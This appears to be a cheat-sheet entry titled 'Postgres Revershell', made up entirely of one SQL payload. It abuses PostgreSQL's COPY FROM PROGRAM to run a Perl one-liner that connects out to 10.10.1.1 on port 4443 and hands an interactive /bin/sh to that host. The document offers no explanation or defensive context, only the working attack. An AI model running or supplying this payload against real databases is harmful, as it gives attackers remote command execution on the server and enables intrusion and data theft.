# Postgres Revershell

```sql
CREATE TEMP TABLE out(line text);

COPY out FROM PROGRAM $$bash -c "perl -e 'use Socket;\$i=\"10.10.1.1\";\$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'"$$;

SELECT * FROM out;

```
